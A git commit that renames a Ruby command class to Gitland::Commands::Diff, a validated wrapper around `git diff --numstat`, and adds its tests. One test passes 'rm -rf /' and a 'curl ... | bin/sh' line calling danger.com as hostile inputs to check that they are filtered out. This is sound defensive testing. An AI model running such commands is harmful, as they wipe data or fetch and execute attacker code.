dd28cbca64f11e8c735775fb7243b4c97daec977
Jonathan Lalande <lalandej.gg@gmail.com>
2024-10-20 22:00:15 -0400

    Rename Commands::ListTreeWithLineNumbers
    This name was a mistake. We're calling `git diff` internally, so lets
    just name it `Commands::Diff`.

---
+++ api/app/services/gitland/commands/diff.rb
@@ -0,0 +1,50 @@
+# frozen_string_literal: true
+
+module Gitland
+  module Commands
+    class Diff < GitCommand
+      EMPTY_DIRECTORY_TREE_HASH = "4b825dc642cb6eb9a060e54bf8d69288fbee4904"
+      HEAD = "HEAD"
+
+      #
+      # Executes `git diff <sha_a> <sha_b>`
+      #
+      def initialize(repository, sha_a: nil, sha_b: nil)
+        @repository = repository
+        @sha_a = sha_a
+        @sha_b = sha_b
+      end
+
+      def execute
+        cli = Git::CommandLine.new({}, "/usr/bin/git", [], Logger.new("/dev/null"))
+
+        command = [ "diff" ]
+        command << "--numstat"
+        command << @sha_a if sha1_input_valid?(@sha_a)
+        command << @sha_b if sha1_input_valid?(@sha_b)
+
+        cli.run(
+          *command,
+          out: nil,
+          err: nil,
+          chdir: Gitland::Storage.new(@repository).absolute_path,
+          normalize: true,
+          merge: false,
+          chomp: true
+        ).stdout
+      end
+
+      private
+
+      def sha1_input_valid?(sha1)
+        return true if sha1 == "HEAD"
+
+        return false unless sha1
+        return false unless sha1.size == 40
+        return false unless Integer(sha1, 16, exception: false)
+
+        true
+      end
+    end
+  end
+end
---
+++ api/test/services/gitland/commands/diff_test.rb
@@ -0,0 +1,69 @@
+require "test_helper"
+
+module Gitland
+  module Commands
+    class DiffTest < ActiveSupport::TestCase
+      def setup
+        @repository = repositories(:rails)
+      end
+
+      test "#execute calls `git diff` with --numstat by default" do
+        mock = mock()
+        mock.expects(:stdout).returns("")
+
+        Git::CommandLine
+          .any_instance
+          .expects(:run)
+          .with do |*args|
+            command, numstat, _ = args
+            assert_equal("diff", command)
+            assert_equal("--numstat", numstat)
+          end
+          .returns(mock)
+
+        Gitland::Commands::Diff.new(@repository).execute
+      end
+
+      test "#execute calls `git diff <sha_a> <sha_b>` when sha_a and sha_b are passed in the initializer" do
+        mock = mock()
+        mock.expects(:stdout).returns("")
+
+        sha_a = "6e73a8703f2226442287533f3b9b81013713d05a"
+        sha_b = "HEAD"
+
+        Git::CommandLine
+          .any_instance
+          .expects(:run)
+          .with do |*args|
+            command, numstat, sha_a, sha_b = args
+            assert_equal("diff", command)
+            assert_equal("--numstat", numstat)
+            assert_equal("6e73a8703f2226442287533f3b9b81013713d05a", sha_a)
+            assert_equal("HEAD", sha_b)
+          end
+          .returns(mock)
+
+        Gitland::Commands::Diff.new(@repository, sha_a: sha_a, sha_b: sha_b).execute
+      end
+
+      test "#execute sanitizes sha_1 and sha_2 by checking if they are valid SHA1 first" do
+        mock = mock()
+        mock.expects(:stdout).returns("")
+
+        sha_a = "rm -rf /"
+        sha_b = "curl http://danger.com/exploitme | bin/sh"
+
+        Git::CommandLine
+          .any_instance
+          .expects(:run)
+          .with do |*args|
+            args.pop # drop kwargs
+            assert_equal([ "diff", "--numstat" ], args)
+          end
+          .returns(mock)
+
+        Gitland::Commands::Diff.new(@repository, sha_a: sha_a, sha_b: sha_b).execute
+      end
+    end
+  end
+end
